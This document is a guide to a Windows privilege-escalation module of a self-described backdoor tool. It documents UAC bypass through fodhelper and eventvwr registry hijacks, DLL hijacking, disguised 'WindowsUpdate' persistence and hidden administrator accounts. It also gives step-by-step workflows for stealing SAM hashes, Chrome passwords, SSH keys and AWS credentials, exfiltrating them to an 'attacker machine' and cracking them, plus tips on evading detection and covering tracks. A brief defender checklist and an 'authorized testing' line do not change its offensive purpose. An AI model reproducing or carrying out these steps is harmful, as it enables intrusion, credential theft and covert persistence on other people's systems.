# Privilege Escalation Implementation Guide

## Overview

Windows-focused privilege escalation module that provides enumeration and exploitation capabilities to identify privilege escalation vectors and elevate access from standard user to administrator.

## Implementation Details

### Architecture

- **Module**: `features/privilege_escalation.py`
- **Class**: `PrivilegeEscalation`
- **Focus**: Windows privilege escalation
- **Platform**: Windows only (returns error on other platforms)

## Commands Reference

### Basic Commands

#### Check Privileges

```bash
priv_check
```

**What happens:**

- Checks current user privileges (Windows only)
- Determines if running as administrator
- Identifies user groups and integrity level
- Shows computer and domain information

**Response (Windows):**

```json
{
  "system": "Windows",
  "is_admin": false,
  "user": "John",
  "user_domain": "DESKTOP-ABC123",
  "computer_name": "DESKTOP-ABC123",
  "user_profile": "C:\\Users\\John",
  "groups": "BUILTIN\\Users\nNT AUTHORITY\\INTERACTIVE\nCONSOLE LOGON",
  "integrity_level": "Medium (Standard User)"
}
```

**Integrity Levels:**

- **High (Admin)**: Running with administrator privileges
- **Medium (Standard User)**: Normal user account
- **Low**: Sandboxed or restricted process

---

### Enumeration Commands

#### Enumerate Escalation Vectors

```bash
priv_enum
```

**What happens:**

- Comprehensive Windows privilege escalation enumeration
- Checks UAC (User Account Control) status
- Checks service permissions
- Retrieves system information

**Response:**

```
=== Windows Privilege Enumeration ===

UAC Status:
{
  "uac_enabled": true,
  "raw_output": "EnableLUA    REG_DWORD    0x1",
  "consent_prompt": "ConsentPromptBehaviorAdmin    REG_DWORD    0x5"
}

Service Permissions:
DisplayName        Name              PathName                             StartMode
CustomService      CustomSvc         C:\Apps\service.exe                  Auto

System Information:
Host Name:                 DESKTOP-ABC123
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19044 N/A Build 19044
```

---

#### Comprehensive Escalation Scan

```bash
priv_scan
```

**What happens:**

- Performs comprehensive Windows privilege escalation scan
- Combines all enumeration techniques
- Returns structured JSON data with all findings
- Includes status, UAC info, system info, services, tasks, sensitive files, weak permissions, and DLL hijacking opportunities

**Response:**

```json
{
  "status": {
    "system": "Windows",
    "is_admin": false,
    "user": "John",
    "integrity_level": "Medium (Standard User)"
  },
  "uac_status": {
    "uac_enabled": true
  },
  "system_info": "Host Name: DESKTOP-ABC123...",
  "services": "SERVICE_NAME: CustomService...",
  "service_permissions": "DisplayName    Name    PathName...",
  "scheduled_tasks": "TaskName    Next Run Time    Status...",
  "sensitive_files": "C:\\Users\\John\\passwords.txt...",
  "weak_file_permissions": ["C:\\Apps\\service.exe (Service binary writable)"],
  "dll_hijacking": ["C:\\Apps\\program.exe -> version.dll"]
}
```

**Use case:**

- Complete Windows system assessment
- Gather all privilege escalation data at once
- Offline analysis of escalation opportunities

---

#### Enumerate Services

```bash
priv_services
```

**What happens:**

- Lists running Windows services
- Shows service states
- Identifies service permissions
- Finds services that could be exploited

**Response (Windows):**

```
SERVICE_NAME: Apache2.4
DISPLAY_NAME: Apache HTTP Server
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING

SERVICE_NAME: MySQL
DISPLAY_NAME: MySQL Server
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
```

---

#### Check Scheduled Tasks

```bash
priv_tasks
```

**What happens:**

- Lists Windows scheduled tasks
- Shows task schedules and status
- Identifies task permissions

**Response (Windows):**

```
TaskName: BackupTask
Next Run Time: 10/4/2025 2:00:00 AM
Status: Ready
Run As User: SYSTEM

TaskName: WindowsUpdate
Next Run Time: N/A
Status: Disabled
```

---

#### Find Sensitive Files

```bash
priv_sensitive
```

**What happens:**

- Searches for sensitive files on Windows
- Looks for credentials, keys, configs
- Searches user directories for .txt, .config, .xml, .ini, .log, .bak files

**Response:**

```
=== *.txt ===
C:\Users\John\passwords.txt
C:\Users\John\Documents\notes.txt
C:\Users\John\Desktop\credentials.txt

=== *.config ===
C:\Users\John\AppData\Roaming\app\config.config
C:\Users\John\.aws\config

=== *.xml ===
C:\Users\John\AppData\Local\app\settings.xml
```

---

### Advanced Enumeration Commands

#### Find Weak File Permissions

```bash
priv_weak_perms
```

**What happens:**

- Searches for writable files in system directories
- Finds writable service binaries
- Checks for writable service directories
- Identifies modifiable files in Program Files

**Response:**

```
Exploitable Files:
C:\Apps\service.exe (Service binary writable)
C:\Apps\ (Service directory writable)
C:\Program Files\CustomApp (Writable program directory)
```

**Use case:**

- Find files for privilege escalation
- Identify writable service configs
- Locate modifiable executables that run as SYSTEM

---

### Admin File Access Commands (New!)

#### Read Admin-Protected Text Files

```bash
priv_read_file <file_path>
```

**What happens:**

- Attempts to read a text file that requires admin privileges
- Uses multiple fallback methods:
  1. Direct Python file I/O
  2. PowerShell Get-Content
  3. Shell commands (type/cat)
- Returns file content or detailed error message
- Suggests UAC bypass if permission denied

**Response (Success):**

```
=== Admin File Read ===
File: C:\Windows\System32\drivers\etc\hosts
Method: powershell
Is Admin: False

Content (150 lines):
# Copyright (c) 1993-2009 Microsoft Corp.
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
127.0.0.1       localhost
::1             localhost
[... full file content ...]
```

**Response (Permission Denied):**

```
=== Admin File Read Failed ===
File: C:\Windows\System32\config\SAM
Error: Permission denied - admin privileges required

Note: Not running as admin. Try:
1. Run 'priv_uac_bypass' to attempt elevation
2. Run backdoor as administrator
3. Use 'priv_check' to verify admin status
```

**Use cases:**

- Read Windows SAM/SYSTEM files for hash extraction
- Access SSH private keys in protected directories
- Read browser credential databases
- Access configuration files with sensitive data
- Extract credentials from application config files

**Examples:**

```bash
# Read Windows password hashes
priv_read_file C:\Windows\System32\config\SAM

# Read SSH private keys
priv_read_file C:\Users\Administrator\.ssh\id_rsa

# Read application configs
priv_read_file "C:\Program Files\App\config\database.xml"

# Read browser login data
priv_read_file "C:\Users\John\AppData\Local\Google\Chrome\User Data\Default\Login Data"
```

---

#### Read Admin-Protected Binary Files

```bash
priv_read_binary <file_path>
```

**What happens:**

- Reads binary files that require admin privileges
- Returns base64-encoded content for safe transmission
- Uses multiple methods:
  1. Direct binary read
  2. PowerShell binary read with base64 conversion
- Safe for executables, DLLs, database files

**Response:**

```
=== Admin Binary File Read ===
File: C:\Windows\System32\cmd.exe
Method: direct_binary_read
File Size: 289,792 bytes
Is Admin: True

Base64 Content (preview - first 200 chars):
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAA...

Full Base64 Content:
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAA
[... continues with full base64 encoded binary ...]
```

**Use cases:**

- Extract Windows executables for analysis
- Download DLL files from System32
- Retrieve SQLite database files (Chrome passwords)
- Extract binary configuration files
- Download protected executables

**Examples:**

```bash
# Extract cmd.exe
priv_read_binary C:\Windows\System32\cmd.exe

# Download Chrome password database (SQLite)
priv_read_binary "C:\Users\John\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Extract DLL for analysis
priv_read_binary C:\Windows\System32\advapi32.dll

# Download SYSTEM registry hive
priv_read_binary C:\Windows\System32\config\SYSTEM
```

**Decoding on attacker machine:**

```python
import base64

# Copy the base64 content from output
base64_content = "TVqQAAMAAAAEAAAA..."

# Decode and save
with open("extracted_file.exe", "wb") as f:
    f.write(base64.b64decode(base64_content))
```

---

#### List Admin-Protected Directory

```bash
priv_list_dir <directory_path>
```

**What happens:**

- Lists contents of directories requiring admin access
- Separates files and subdirectories
- Shows file sizes when available
- Uses fallback methods for access

**Response:**

```
=== Admin Directory Listing ===
Directory: C:\Windows\System32\config
Method: direct_listing
Is Admin: False

Directories (3):
  - systemprofile
  - TxR
  - RegBack

Files (15):
  - BBI (size: 65,536 bytes)
  - BCD-Template (size: 25,600 bytes)
  - DEFAULT (size: 262,144 bytes)
  - SAM (size: 262,144 bytes)
  - SECURITY (size: 262,144 bytes)
  - SOFTWARE (size: 45,088,768 bytes)
  - SYSTEM (size: 17,301,504 bytes)
  - COMPONENTS (size: 12,582,912 bytes)
  [...]
```

**Use cases:**

- Browse Windows System32\config directory
- List user AppData folders
- Explore Program Files directories
- Enumerate SSH key directories
- Browse Windows credential stores

**Examples:**

```bash
# List config directory
priv_list_dir C:\Windows\System32\config

# Browse user AppData
priv_list_dir "C:\Users\John\AppData\Local\Google\Chrome\User Data\Default"

# Check SSH directory
priv_list_dir C:\Users\Administrator\.ssh

# List Windows credentials
priv_list_dir C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
```

---

### Exploitation Commands

#### Windows UAC Bypass

```bash
priv_uac_bypass
```

**What happens:**

- Attempts UAC bypass on Windows
- Uses fodhelper.exe method
- Uses ComputerDefaults.exe method
- Uses eventvwr.exe method
- Modifies registry to bypass UAC

**Response:**

```
UAC bypass attempts: fodhelper.exe registry keys created, fodhelper.exe executed, ComputerDefaults.exe executed, eventvwr.exe executed
```

**Warning:**

- This is for educational purposes only!
- Requires Windows target
- May be detected by antivirus
- Creates temporary registry entries

**How it works:**

1. Creates registry keys in HKCU\Software\Classes\ms-settings\Shell\Open\command
2. Sets the payload path as the command
3. Executes trusted Windows binaries (fodhelper, ComputerDefaults, eventvwr)
4. These binaries auto-elevate without UAC prompt
5. They execute the payload with elevated privileges
6. Cleans up registry keys after execution

---

#### DLL Hijacking Opportunities

```bash
priv_dll_hijack
```

**What happens:**

- Searches for DLL hijacking opportunities (Windows only)
- Finds executables in writable directories
- Identifies missing DLLs that can be hijacked
- Checks Program Files, AppData, and user directories

**Response:**

```
DLL Hijacking Opportunities:
C:\Program Files\CustomApp\app.exe -> version.dll
C:\Users\John\AppData\Local\App\program.exe -> dwmapi.dll
C:\Program Files (x86)\OldApp\legacy.exe -> uxtheme.dll
C:\Users\John\AppData\Roaming\Service\service.exe -> WINMM.dll
```

**Common hijackable DLLs:**

- version.dll
- dwmapi.dll
- uxtheme.dll
- propsys.dll
- cryptsp.dll
- WINMM.dll
- WTSAPI32.dll

**Use case:**

- Windows privilege escalation
- Find executables vulnerable to DLL hijacking
- Identify writable application directories
- Create malicious DLL to gain code execution

**How to exploit:**

1. Find an executable with a missing DLL in a writable directory
2. Create a malicious DLL with the same name
3. Place it in the executable's directory
4. When the executable runs, it loads your DLL
5. Your DLL code executes with the executable's privileges

---

### Persistence Commands

#### Create Persistence Mechanism

```bash
priv_persist
```

Creates persistence using default payload path (current executable).

```bash
priv_persist C:\Tools\backdoor.exe
```

Creates persistence with custom payload path.

**What happens:**

- Creates multiple Windows persistence mechanisms
- **Method 1:** Registry Run key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
- **Method 2:** Startup folder batch file
- **Method 3:** Registry RunOnce key
- **Method 4:** Scheduled task as SYSTEM (if admin)

**Response:**

```
Persistence mechanisms: Registry Run key created (HKCU), Startup folder persistence created, Registry RunOnce key created, Scheduled task created (SYSTEM)
```

**Persistence Methods:**

1. **Registry Run Key (HKCU)**

   - Runs on user login
   - Does not require admin
   - Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
   - Value: "WindowsUpdate" = "C:\path\to\payload.exe"

2. **Startup Folder**

   - Runs on user login
   - Does not require admin
   - Location: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
   - Creates batch file: WindowsUpdate.bat

3. **Registry RunOnce Key**

   - Runs once on next login
   - Does not require admin
   - Key: HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

4. **Scheduled Task (Admin only)**
   - Runs as SYSTEM on logon
   - Requires administrator privileges
   - Task name: "WindowsUpdateCheck"
   - Highest privileges

**Use case:**

- Maintain access after reboot
- Create backdoor auto-start
- Survive system restarts
- Multiple fallback methods

---

#### Create Backdoor User

```bash
priv_user
```

Creates user with default credentials (username: support, password: P@ssw0rd123).

```bash
priv_user admin MySecretPass123
```

Creates custom user with specified credentials.

**What happens:**

- Creates new Windows user account (requires administrator)
- Adds user to Administrators group
- Hides user from login screen via registry

**Response:**

```
Backdoor user 'admin' created and hidden from login screen
```

**How it works:**

1. Executes: `net user <username> <password> /add`
2. Executes: `net localgroup administrators <username> /add`
3. Sets registry key: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
4. Sets value: <username> = 0 (hides from login screen)

**Warning:**

- Requires administrator privileges!
- User will not appear on Windows login screen
- User can still be seen in Computer Management
- Can be detected by security tools

**Use case:**

- Persistent administrative access
- Hidden backup admin account
- Alternative access method

---

## Troubleshooting

### Issue 1: "Permission denied" errors

**Cause:** Insufficient privileges to read certain files/directories

**Solution:**

```bash
# Expected behavior
# Some enumeration requires root access
# Note files you CAN'T access (interesting targets)

# Try privilege escalation first, then re-run
```

---

### Issue 2: priv_enum returns limited results

**Causes:**

- Not running with sufficient privileges
- System hardened/minimal
- Commands not available

**Solutions:**

```bash
# Install enumeration tools
sudo apt-get install linux-exploit-suggester

# Manual enumeration
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
```

---

### Issue 3: No SUID binaries found

**Cause:** Find command failed or not in PATH

**Solution:**

```bash
# Manual SUID search
find / -perm -4000 -type f 2>/dev/null

# Or locate specific binaries
which find vim nano less
```

---

### Issue 4: "Command not found" errors

**Cause:** System commands not available or not in PATH

**Solution:**

```bash
# Check PATH
echo $PATH

# Try full paths
/usr/bin/sudo -l
/bin/find / -perm -4000
```

## Limitations

### Technical Limitations

1. **Windows Only**

   - Only works on Windows systems
   - Returns error on Linux/macOS
   - Platform-specific techniques
   - Windows-focused enumeration

2. **Enumeration Focus**

   - Primarily identifies vulnerabilities
   - Some exploitation capabilities included
   - UAC bypass may not always work
   - Manual exploitation often needed

3. **Requires Execution**

   - Must run on target Windows system
   - Needs basic user privileges
   - Some checks require administrator
   - May trigger Windows Defender/antivirus

4. **Limited Coverage**
   - Can't check all Windows vulnerabilities
   - May miss custom misconfigurations
   - Doesn't test all exploit methods
   - Basic Windows enumeration

### Detection Risks

1. **Command Execution**

   - Running enumeration commands logged in Windows Event Log
   - Service queries trigger security events
   - Registry modifications detected
   - Unusual process activity flagged

2. **File Access**

   - Reading sensitive files logged
   - Failed access attempts recorded
   - May trigger File Integrity Monitoring
   - Windows Defender may flag behavior

3. **Registry Modification**
   - UAC bypass creates registry keys
   - Persistence methods modify registry
   - Registry changes audited
   - Easy to detect with proper monitoring

### Functional Limitations

1. **No Automated Exploitation**

   - Doesn't auto-exploit all findings
   - Manual interpretation required
   - UAC bypass may fail
   - Enumeration tool primarily

2. **No Custom Checks**

   - Standard Windows vectors only
   - Doesn't check application-specific vulnerabilities
   - No custom binary analysis
   - Limited to known Windows techniques

3. **Output Limitations**
   - Large output for complex systems
   - May need filtering/parsing
   - Information overload possible
   - Manual review required

---

## Best Practices

### 1. Systematic Enumeration

```bash
# Follow this order:
# 1. Check current status
priv_check

# 2. Comprehensive enumeration
priv_enum

# 3. Full scan
priv_scan

# 4. Service analysis
priv_services

# 5. Scheduled task review
priv_tasks

# 6. Sensitive file discovery
priv_sensitive

# Save all output for offline analysis
```

### 2. Documentation

```bash
# Save all enumeration results
# (From attacker server after receiving responses)
# Save each command output to separate files for analysis
```

### 3. Prioritization

```bash
# Focus on highest-impact Windows findings:
# 1. Writable service binaries
# 2. Unquoted service paths
# 3. Writable service directories
# 4. DLL hijacking opportunities
# 5. Scheduled tasks running as SYSTEM
# 6. Weak file permissions in Program Files
# 7. Sensitive files with credentials
```

### 4. Exploitation Strategy

```bash
# After enumeration, exploit based on findings:

# If UAC bypass available:
priv_uac_bypass

# If writable service binary found:
# Replace service binary with payload
# Restart service to gain SYSTEM

# If DLL hijacking opportunity:
# Create malicious DLL
# Place in target directory
# Wait for or trigger execution

# Always create persistence:
priv_persist C:\path\to\payload.exe
```

---

## Attack Scenarios

### Scenario 1: UAC Bypass to Administrator

```bash
# 1. Check current privileges
priv_check
# Result: is_admin=false, integrity_level="Medium (Standard User)"

# 2. Check UAC status
priv_enum
# Result: UAC enabled

# 3. Attempt UAC bypass
priv_uac_bypass
# Result: fodhelper.exe executed, registry keys created

# 4. Verify escalation (in new elevated process)
priv_check
# Result: is_admin=true, integrity_level="High (Admin)"

# 5. Create persistence as admin
priv_persist
# Result: Scheduled task created as SYSTEM
```

---

### Scenario 2: DLL Hijacking

```bash
# 1. Find DLL hijacking opportunities
priv_dll_hijack
# Finds: C:\Program Files\CustomApp\app.exe -> version.dll

# 2. Create malicious DLL
# (On attacker machine, create version.dll with payload)
# Export DllMain function
# Add reverse shell code

# 3. Upload malicious DLL
# upload version.dll

# 4. Move DLL to target directory
# (Use file system commands to place DLL)
# move version.dll "C:\Program Files\CustomApp\version.dll"

# 5. Wait for or trigger application execution
# Result: Payload executes with application's privileges
```

---

### Scenario 3: Writable Service Binary

```bash
# 1. Find weak file permissions
priv_weak_perms
# Finds: C:\Apps\service.exe (Service binary writable)

# 2. Check service details
priv_services
# Find service running as SYSTEM with auto-start

# 3. Replace service binary with payload
# upload backdoor.exe
# move /Y backdoor.exe C:\Apps\service.exe

# 4. Restart service (if admin) or wait for reboot
# sc stop ServiceName
# sc start ServiceName
# Result: Payload executes as SYSTEM
```

---

### Scenario 4: Sensitive File Credentials

```bash
# 1. Find sensitive files
priv_sensitive
# Finds: C:\Users\John\passwords.txt

# 2. Download and read file
# download C:\Users\John\passwords.txt
# File contains: Admin password: SuperSecret123

# 3. Create backdoor admin user
priv_user backdoor SuperSecret123
# Result: Backdoor administrator account created and hidden

# 4. Create persistence
priv_persist
# Result: Multiple persistence mechanisms created
```

---

### Scenario 5: Admin File Access - SAM Hash Extraction (New!)

```bash
# Complete workflow for extracting Windows password hashes

# 1. Check current privileges
priv_check
# Result: is_admin=false

# 2. Attempt to read SAM file (will fail)
priv_read_file C:\Windows\System32\config\SAM
# Result: Permission denied - suggests running priv_uac_bypass

# 3. List the config directory to see what's there
priv_list_dir C:\Windows\System32\config
# Result: Shows SAM, SYSTEM, SECURITY, SOFTWARE files

# 4. Attempt UAC bypass for elevation
priv_uac_bypass
# Result: UAC bypass executed with fodhelper.exe

# 5. Verify elevation
priv_check
# Result: is_admin=true, integrity_level="High (Admin)"

# 6. Now read the SAM file (contains password hashes)
priv_read_binary C:\Windows\System32\config\SAM
# Result: Base64-encoded SAM file

# 7. Read the SYSTEM file (needed to decrypt SAM)
priv_read_binary C:\Windows\System32\config\SYSTEM
# Result: Base64-encoded SYSTEM file

# 8. On attacker machine, decode and save both files:
echo "BASE64_SAM_CONTENT" | base64 -d > SAM
echo "BASE64_SYSTEM_CONTENT" | base64 -d > SYSTEM

# 9. Extract hashes with samdump2 or pwdump:
samdump2 SYSTEM SAM
# Result: NTLM password hashes for all users

# 10. Crack hashes with hashcat or john:
hashcat -m 1000 hashes.txt rockyou.txt
# Result: Plaintext passwords recovered
```

---

### Scenario 6: Admin File Access - Browser Credential Theft (New!)

```bash
# Complete workflow for stealing saved browser passwords

# 1. List Chrome user data directory
priv_list_dir "C:\Users\John\AppData\Local\Google\Chrome\User Data\Default"
# Result: Shows Login Data, Cookies, History, etc.

# 2. Read the Login Data file (SQLite database with passwords)
priv_read_binary "C:\Users\John\AppData\Local\Google\Chrome\User Data\Default\Login Data"
# Result: Base64-encoded SQLite database

# 3. On attacker machine, decode and save:
echo "BASE64_CONTENT" | base64 -d > LoginData.db

# 4. Query the database for saved credentials:
sqlite3 LoginData.db "SELECT origin_url, username_value, password_value FROM logins"
# Result: Encrypted passwords (require Chrome master key to decrypt)

# 5. Read the Local State file to get encryption key
priv_read_file "C:\Users\John\AppData\Local\Google\Chrome\User Data\Local State"
# Result: JSON file with encrypted_key

# 6. Use Chrome password decryption tools:
# - Use Python script with win32crypt (Windows)
# - Or use tools like LaZagne, ChromePass
# Result: Plaintext passwords for all saved credentials
```

---

### Scenario 7: Admin File Access - SSH Key Theft (New!)

```bash
# Complete workflow for stealing SSH private keys

# 1. List user's SSH directory
priv_list_dir C:\Users\Administrator\.ssh
# Result: Shows id_rsa, id_rsa.pub, authorized_keys, known_hosts

# 2. Read the private key
priv_read_file C:\Users\Administrator\.ssh\id_rsa
# Result: Private SSH key content (PEM format)

# 3. Save the key on attacker machine
# Copy the key content to id_rsa file

# 4. Set proper permissions
chmod 600 id_rsa

# 5. Read authorized_keys to see which servers
priv_read_file C:\Users\Administrator\.ssh\authorized_keys
# Result: List of authorized public keys

# 6. Read known_hosts to see connection history
priv_read_file C:\Users\Administrator\.ssh\known_hosts
# Result: List of previously connected servers

# 7. Use the stolen key to connect
ssh -i id_rsa administrator@target-server.com
# Result: SSH access to remote servers without password
```

---

### Scenario 8: Admin File Access - Application Credentials (New!)

```bash
# Complete workflow for extracting application credentials

# 1. List common credential locations
priv_list_dir "C:\Users\John\AppData\Roaming"
# Result: Shows application folders (FileZilla, PuTTY, etc.)

# 2. Read FileZilla saved sites (FTP credentials)
priv_read_file "C:\Users\John\AppData\Roaming\FileZilla\sitemanager.xml"
# Result: XML with FTP server credentials in plaintext

# 3. Read PuTTY saved sessions
priv_list_dir "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions"
# Result: List of saved SSH sessions

# 4. Read database connection strings
priv_read_file "C:\Program Files\MyApp\config\database.config"
# Result: Database credentials (server, username, password)

# 5. Read .aws credentials
priv_read_file C:\Users\John\.aws\credentials
# Result: AWS access keys and secrets

# 6. Read .git config
priv_read_file C:\Projects\MyRepo\.git\config
# Result: Git remote URLs (may contain credentials)

# 7. Compile all credentials for offline analysis
# Result: Complete credential database for target user
```

---

## Performance Impact

- **CPU**: Minimal to Low (service queries can be intensive)
- **Memory**: Low (output can be moderate)
- **Disk**: Read-only operations mostly
- **Network**: None (all local operations)
- **Time**:
  - priv_check: < 1 second
  - priv_enum: 5-15 seconds
  - priv_services: 2-5 seconds
  - priv_tasks: 3-8 seconds
  - priv_sensitive: 10-60 seconds (file searches in user directories)
  - priv_weak_perms: 10-30 seconds (service enumeration)
  - priv_dll_hijack: 30-120 seconds (searches multiple directories)
  - priv_scan: 60-180 seconds (comprehensive scan)

## Security Considerations

### For Attackers

✅ Run enumeration early to understand the environment
✅ Save all output for offline analysis
✅ Try UAC bypass if not admin
✅ Look for DLL hijacking opportunities
✅ Create multiple persistence mechanisms
✅ Cover tracks after escalation
❌ Don't repeatedly run UAC bypass (gets detected)
❌ Avoid triggering Windows Defender alerts
❌ Don't create obvious backdoor usernames

### For Defenders

✅ Monitor for UAC bypass registry keys
✅ Enable Windows Event Log auditing
✅ Monitor service binary modifications
✅ Use AppLocker or Windows Defender Application Control
✅ Restrict DLL loading with Safe DLL Search Mode
✅ Monitor scheduled task creation
✅ Use Windows Defender ATP/EDR
✅ Regular security assessments
✅ Principle of least privilege
✅ Keep Windows updated

## Summary

Windows privilege escalation features:
✅ Current privilege assessment
✅ UAC status checking
✅ Service enumeration and permission analysis
✅ Scheduled task review
✅ Sensitive file discovery
✅ UAC bypass techniques (fodhelper, ComputerDefaults, eventvwr)
✅ DLL hijacking opportunity identification
✅ Multiple persistence mechanisms
✅ Backdoor user creation (admin only)
✅ Comprehensive Windows enumeration
✅ **Admin file reading (text files with fallback methods)** - NEW!
✅ **Admin file reading (binary files with base64 encoding)** - NEW!
✅ **Admin directory listing (with file/directory separation)** - NEW!

**This is primarily an enumeration tool with exploitation and file access capabilities. Use only in authorized Windows testing environments.**
